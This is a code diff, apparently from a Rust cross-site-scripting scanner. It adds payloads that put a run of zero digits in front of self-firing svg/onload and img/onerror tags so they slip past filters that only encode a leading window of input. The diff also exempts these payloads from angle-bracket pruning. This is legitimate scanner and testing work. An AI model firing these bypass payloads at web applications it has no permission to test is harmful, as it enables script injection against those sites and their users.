@@ -36,6 +36,35 @@ const MAX_SYNTHESIZED: usize = 48;
 /// `confirm`/`print` alternates survive a denylist on the literal `alert`.
 const JS_FUNCS: &[&str] = &["alert(1)", "alert`1`", "confirm(1)"];
 
+/// Leading-window ("positional") filter bypass — see [`positional_pad_payloads`].
+///
+/// Digit run prepended to a tag payload so the real vector lands past a filter
+/// that only entity-encodes / strips a fixed *leading window* of the reflected
+/// value. Digits are never in [`crate::parameter_analysis::SPECIAL_PROBE_CHARS`]
+/// (always "allowed") and are inert in every HTML context — they cannot form a
+/// tag name, close a quote, or start an entity — so the pad shifts the payload's
+/// byte offset without changing how the tail parses.
+///
+/// Two lengths: 24 covers the common small windows (10 / 20) with a compact
+/// PoC, 64 covers larger ones. A window wider than the longest pad simply misses
+/// (nothing is emitted that could be a false positive).
+const POSITIONAL_PAD_LENGTHS: &[usize] = &[24, 64];
+
+/// Minimum leading-digit run that marks a payload as a positional-pad bypass.
+/// The shortest [`POSITIONAL_PAD_LENGTHS`] entry is well above this, and no
+/// genuine payload begins with this many digits, so it cleanly identifies the
+/// pad shape for the raw-angle prune exemption ([`is_positional_pad_bypass`])
+/// without a sentinel shared across modules.
+const POSITIONAL_PAD_MIN_RUN: usize = 12;
+
+/// Self-firing tag shapes a leading-window angle filter would otherwise defeat.
+/// A fresh injected tag carries a `class` marker safely — the duplicate-`class`
+/// drop only bites when breaking out of an existing `class="…"` attribute.
+const POSITIONAL_PAD_SHAPES: &[&str] = &[
+    "<svg onload=alert(1) class={CLASS}>",
+    "<img src=x onerror=alert(1) class={CLASS}>",
+];
+
 /// What a parameter's server-side filter permits.
 struct FilterProfile<'a> {
     invalid: &'a [char],
@@ -435,6 +464,71 @@ pub(crate) fn synthesize_payloads(
     }
 
     out
+}
+
+/// Leading-window ("positional") filter bypass payloads.
+///
+/// Some server-side filters entity-encode or strip only a fixed *leading window*
+/// of the reflected value (e.g. "the first 20 characters are entity-encoded, the
+/// rest is raw" or "alphabetic characters in the first 10 are hex-encoded").
+/// Active probing places its per-character probe near the start of the value, so
+/// such a filter makes the tag-forming characters (`<` / `>`) look
+/// unconditionally blocked in `invalid_specials` when they are in fact usable
+/// past the window. Both [`synthesize_payloads`] and the broad catalog then obey
+/// that (mis)classification and drop every tag payload, so the reflection is
+/// missed entirely even though it is exploitable.
+///
+/// This emits a small, fixed set of *padded* tag payloads: a run of inert digits
+/// (see [`POSITIONAL_PAD_LENGTHS`]) followed by a self-firing tag carrying the
+/// class marker, so the real vector lands past the leading window. It is only
+/// meaningful for an HTML-text reflection, which needs a tag injection — an
+/// attribute-context reflection already breaks out angle-free and gains nothing.
+///
+/// Emitted for **every** HTML-text reflection, not gated on `invalid_specials`,
+/// because a leading-window filter is invisible to the per-character probe: the
+/// probe places its `<` past the window, so it reflects raw and `<` is recorded
+/// *valid* — yet the real payload puts `<` at offset 0, inside the window, where
+/// it is encoded. There is thus no filter-profile signal to gate on. The cost is
+/// nil on an easily-exploitable parameter: the ordinary tag payloads run first
+/// (see the caller's ordering) and the DOM phase stops at the first `[V]`, so
+/// these padded variants are only ever *sent* when the plain tags all failed —
+/// exactly the positional-filter case they exist for.
+///
+/// FP-safe by the same DOM-marker verification as everything else: if there is
+/// no positional window (an unfiltered param already verified above, or a proper
+/// filter encodes `<` everywhere), the padded `<` is either redundant or still
+/// encoded, so the marker element never materializes and nothing promotes to
+/// `[V]`; the encoded echo is inert and adds no `[R]` either.
+///
+/// These payloads deliberately carry raw `<` / `>` even when those characters
+/// are in `invalid_specials`, so the caller's raw-angle prune must exempt them
+/// via [`is_positional_pad_bypass`].
+pub(crate) fn positional_pad_payloads(context: &InjectionContext) -> Vec<String> {
+    // Only HTML-text reflections need a tag injection; attribute/JS/CSS contexts
+    // break out without `<`, so a positional angle filter never blocks them.
+    if !matches!(context, InjectionContext::Html(_)) {
+        return Vec::new();
+    }
+    let class = crate::scanning::markers::class_marker();
+    let mut out = Vec::with_capacity(POSITIONAL_PAD_LENGTHS.len() * POSITIONAL_PAD_SHAPES.len());
+    for &pad_len in POSITIONAL_PAD_LENGTHS {
+        let pad = "0".repeat(pad_len);
+        for shape in POSITIONAL_PAD_SHAPES {
+            out.push(format!("{pad}{}", shape.replace("{CLASS}", class)));
+        }
+    }
+    out
+}
+
+/// Whether `payload` is a [`positional_pad_payloads`] leading-window bypass: it
+/// begins with a run of at least [`POSITIONAL_PAD_MIN_RUN`] ASCII digits
+/// immediately followed by a `<`. The raw-angle prune (which drops any payload
+/// carrying a `<`/`>` the filter reports blocked) must keep these — their whole
+/// premise is that the block is positional, so the raw `<` *can* pass once the
+/// pad pushes it past the window.
+pub(crate) fn is_positional_pad_bypass(payload: &str) -> bool {
+    let digits = payload.bytes().take_while(u8::is_ascii_digit).count();
+    digits >= POSITIONAL_PAD_MIN_RUN && payload.as_bytes().get(digits) == Some(&b'<')
 }
 
 #[cfg(test)]
